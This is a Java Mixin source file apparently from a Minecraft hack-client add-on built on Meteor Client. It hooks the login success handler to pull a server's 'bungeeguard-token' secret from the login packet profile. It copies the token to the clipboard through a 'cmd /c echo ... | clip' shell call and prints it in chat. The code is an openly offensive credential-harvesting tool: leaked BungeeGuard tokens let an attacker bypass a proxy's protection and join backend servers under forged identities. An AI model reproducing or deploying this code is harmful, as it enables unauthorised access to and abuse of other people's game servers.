package com.x310.clarity.mixin;

import com.mojang.authlib.properties.Property;
import com.mojang.authlib.properties.PropertyMap;
import com.x310.clarity.modules.BungeeGuard;
import com.x310.clarity.modules.ChannelFetch;
import meteordevelopment.meteorclient.systems.modules.Modules;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientLoginNetworkHandler;
import net.minecraft.network.packet.s2c.login.LoginSuccessS2CPacket;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;


@Mixin(ClientLoginNetworkHandler.class)
public class LoginHandlerMixin {
    public void copyToClipboard(String token) {
        if (token != null && token.matches("^[a-zA-Z0-9]+$")) {
            try {
                String command = "cmd /c echo " + token + " | clip";
                Process process = Runtime.getRuntime().exec(command);
                System.out.println(process.waitFor());
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        } else {
            System.err.println("Malicious Token Rejected");
        }
    }

    @Inject(method = "onSuccess", at = @At("HEAD"))
    public void onSuccess(LoginSuccessS2CPacket packet, CallbackInfo ci) {
        if (Modules.get().get(BungeeGuard.class).isActive()) {
            System.out.println("Mixin injected into onSuccess()");
            PropertyMap map = packet.profile().getProperties();

            Property tokenProperty = null;
            for (Property property : map.values()) {
                if (property.name().equals("bungeeguard-token")) {
                    tokenProperty = property;
                    break;
                }
            }

            String message;

            if (tokenProperty != null) {
                String token = tokenProperty.value();
                copyToClipboard(token);
                message = "§c[§6B§eu§an§3g§9e§5e§cG§6u§ea§ar§3d§9]§r Token found: " + token;
            } else {
                message = "§c[§6B§eu§an§3g§9e§5e§cG§6u§ea§ar§3d§9]§r No token found";
            }

            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    MinecraftClient.getInstance().execute(() ->
                        MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(Text.of(message)));
                }
            }, 3000);
        }
    }
}
